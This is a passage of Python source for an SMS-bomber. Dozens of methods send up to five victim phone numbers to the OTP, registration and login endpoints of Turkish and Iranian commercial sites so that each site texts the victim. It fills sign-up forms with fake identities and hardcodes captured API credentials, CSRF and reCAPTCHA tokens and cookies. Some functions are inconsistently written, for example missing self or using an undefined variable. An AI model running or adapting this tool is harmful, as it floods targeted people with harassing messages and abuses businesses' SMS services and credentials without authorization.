                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api2.e-bebek.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api2.e-bebek.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #sakasu.com.tr
    def Saka(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
                    json={"gsm": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["status"]) == 1 :
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #gofody.com
    def Gofody(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"
                    json={"country_code": "90", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #madamecoco.com
    def Madame(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.madamecoco.com:443/users/registration/"
                    headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
                    data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #balikesiruludag.com.tr
    def Buludag(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bilet.balikesiruludag.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #evidea.com
    def Evidea(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.evidea.com:443/users/register/"
                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
                    r = requests.post(url, headers=headers, data=data)      
                    if r.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #koctas.com.tr
    def Koctas(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
                    data = {"givePermission": "true", "mobileNumber": numara}
                    r = requests.post(url, data=data)
                    if (r.json()["status"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> occ2.koctas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> occ2.koctas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #gratis.com
    def Gratis(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
                    url = "https://ivt.mobildev.com:443/data/0e80tyg8"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
                    json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    def filmnet(phone):
        fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
        fNh = {'Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','DNT': '1','X-Platform': 'Web','User-Agent': generate_user_agent(os="win"),'Origin': 'https://filmnet.ir','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://filmnet.ir/','Accept-Language': 'fa,en-US;q=0.9,en;q=0.8','Cache-Control': 'no-cache','Accept-Encoding': 'gzip, deflate'}
        try:
            get(url=fnU, headers=fNh)
            return True
        except:
            pass


    def drdr(phone):
        dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
        drh = {'Connection': 'keep-alive','Accept': 'application/json','Authorization': 'hiToken','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://drdr.ir','Referer': 'https://drdr.ir/','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate'}
        try:
            post(url=dru, headers=drh, params={"phoneNumber": phone, "userType": "PATIENT"})
            return True
        except:
            pass



    def itoll(phone):
        itJ = {'mobile': phone}
        itU = 'https://app.itoll.ir/api/v1/auth/login'
        itH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa','content-type': 'application/json;charset=UTF-8','origin': 'https://itoll.ir','referer': 'https://itoll.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=itU, headers=itH, json=itJ)
            return True
        except:
            pass




    def namava(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": phone},headers=rhead ,timeout=5)
            return True
        except:
            pass



    def anar(phone):
        anrJ = {'user': phone, 'app_id': 99}
        anrU = 'https://api.anargift.com/api/people/auth'
        anrH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '34','content-type': 'application/json;charset=UTF-8','origin': 'https://anargift.com','referer': 'https://anargift.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=anrU, headers=anrH, json=anrJ)
            return True
        except:
            pass


    def azki(phone):
        azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
        azkH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==','device': 'web','deviceid': '6','password': 'BimitoSecret','origin': 'https://www.azki.com','referer': 'https://www.azki.com/','user-agent': generate_user_agent(os="linux"),'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE','username': 'BimitoClient'
        }
        try:
            post(url=azkU, headers=azkH)
            return True
        except:
            pass


   

    def ragham_call(phone):
        # Call and sms 
        n4 = {"phone":phone}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
            return True
        except:
            pass
    

    # dsmartgo.com.tr
    def Dsmartgo(self):
        dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	"IsSubscriber": "true",
        	"__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	"Mobile": self.phone,
        }, cookies={
        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		"_ga": "GA1.3.1016548678.1638216163",
        		"_gat": "1",
        		"_gat_gtag_UA_18913632_14": "1",
        		"_gid": "GA1.3.1214889554.1638216163",
        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	})
        try:
            BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr")
        except AttributeError:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr")
            self.adet += 1
        

    # kigili.com
    def Kigili(self):    
        try:
            kigili = requests.post("https://www.kigili.com/users/registration/", data={
                "first_name": "Memati",
                "last_name": "Bas",
                "email": self.mail,
                "phone": f"0{self.phone}",
                "password": "31ABC..abc31",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            })
            if kigili.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
        

    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
        

    #naosstars.com
    def NaosStars(self):
        try:
            naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                "email": self.mail,
                "first_name": "Memati",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "date_of_birth": "1975-12-31",
                "phone": f"0{self.phone}",
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            })
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> shop.naosstars.com")
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com")
          
        
    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
         
    
    #istegelsin.com
    def IsteGelsin(self):
        try:
            json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(self.phone)}}
            r = requests.post("https://prod.fasapi.net:443/",  json=json)
            if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
            
        
    #ceptesok.com
    def Sok(self):
        try:
            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": self.phone, "token_type": "register_token"})
            if len(r.json()["meta"]["messages"]["success"]) != 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ceptesok.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ceptesok.com")
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": self.phone
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
            
    
    #migros.com.tr
    def Migros(self):
        try:
            migros = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": self.phone})
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
            
    
    #a101.com.tr
    def A101(self):
        try:
            url = "https://www.a101.com.tr:443/users/otp-login/"
            data = {"phone": f"0{self.phone}", "next": "/a101-kapida"}
            r = requests.post(url,data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
                self.adet += 1
            else:
                raise 
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")


    #englishhome.com
    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
            
            
    #sakasu.com.tr
    def Sakasu(self):
        try:
            data = {"phone": self.phone}
            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")
            
    
    #rentiva.com
    def Rentiva(self): 
        try:
            url = "https://rentiva.com:443/api/Account/Login"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
            json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": self.phone, "type": 1}
            rentiva = requests.post(url, headers=headers, json=json)
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")
            
    
    #bineq.tech
    def Bineq(self):
        try:
            url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            bineq = requests.post(url, headers=headers)
            if bineq.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
            
            
    #superpedestrian.com
    def Link(self):
        try:
            url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
            json={"phone_number": f"+90{self.phone}"}
            link = requests.post(url, json=json)
            if link.json()["detail"] == "Ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> consumer-auth.linkfleet.de")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> consumer-auth.linkfleet.de")

            
    #loncamarket.com
    def Lonca(self):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            json={"Address": self.phone, "ConfirmationType": 0}
            lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
            if lonca.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com")   
            
    
    #dgnonline.com
